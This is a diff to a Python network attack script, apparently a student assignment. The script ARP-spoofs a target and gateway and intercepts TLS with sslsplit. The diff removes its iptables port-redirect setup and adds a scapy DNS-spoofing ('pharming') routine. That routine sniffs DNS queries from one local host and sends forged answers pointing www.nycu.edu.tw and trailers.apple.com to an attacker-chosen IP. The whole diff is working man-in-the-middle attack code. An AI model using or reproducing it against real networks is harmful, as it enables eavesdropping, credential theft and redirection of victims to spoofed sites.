@@ -2,6 +2,7 @@
 
 import netifaces
 import scapy.all as scapy
+from scapy.all import DNS, DNSQR, DNSRR, IP, UDP
 import time
 import threading
 import os
@@ -145,12 +146,6 @@ def sslSplit(stop):
     pathname = os.path.realpath(__file__)
     last = pathname.rfind('/')
     mypath = pathname[:last]
-    # iptable config
-    os.system("sysctl -w net.ipv4.ip_forward=1")
-    os.system("iptables -t nat -F")
-    os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080")
-    os.system("iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443")
-
     # run sslsplit
     command =   'sslsplit -d -l ' + mypath + '/sslsplit/connections.log'\
             ' -j ' + mypath + '/sslsplit/'\
@@ -167,8 +162,31 @@ def sslSplit(stop):
         for i in onlyfiles:
             record = get_information(logpath + i, record)
         time.sleep(5)
-    
-    # delete iptable
+
+def pharming_callback(pkt):
+    # trigger each capture
+    # http://www.nycu.edu.tw
+    # print("\n")
+    pkt.show()
+    # print(type(pkt))
+    # print("\n\n\n")
+    # print("callback")
+    try:
+        question = str(pkt[DNS].qd.qname)
+    except:
+        return
+    # print(question)
+    if question.find('www.nycu.edu.tw') != -1:
+        # find it
+        print('find it')
+        local_ip = '140.113.207.246'
+        spf_resp = IP(dst=pkt[IP].src)/UDP(dport=pkt[UDP].sport, sport=53)/DNS(id=pkt[DNS].id,ancount=1,an=DNSRR(rrname=pkt[DNSQR].qname, rdata=local_ip)/DNSRR(rrname="trailers.apple.com",rdata=local_ip))
+        scapy.send(spf_resp, verbose=0)
+
+def pharming(stop):
+    # port 53 UDP
+    scapy.sniff(filter="host 172.20.10.4 and udp port 53", count = 10, prn = pharming_callback)
+
 
 
 
@@ -185,9 +203,10 @@ if __name__ == '__main__':
     gateway_ip = gw
 
 
-    t = threading.Thread(target = sslSplit, args =(lambda : stop_threads, ))
-    t.start()
-    stop_threads = False
+    # t = threading.Thread(target = sslSplit, args =(lambda : stop_threads, ))
+    # t = threading.Thread(target = pharming, args =(lambda : stop_threads, ))
+    # t.start()
+    # stop_threads = False
 
     try:
         sent_packets_count = 0
@@ -204,19 +223,5 @@ if __name__ == '__main__':
         restore(target_ip, gateway_ip)
         print("[-] Arp Spoof Stopped")
         stop_threads = True
-        t.join()
+        # t.join()
         print("stop thread")
-
-    # interface = netifaces.interfaces()[1]
-    # print('=============')
-    # print('Interface Info')
-    # print('=============')
-    # print(netifaces.ifaddresses(interface))
-    # print(' ')
-
-    # request = scapy.ARP()
-    # print('============')
-    # print('Request Info')
-    # print('============')
-    # print(request.summary())
-    # print(' ')
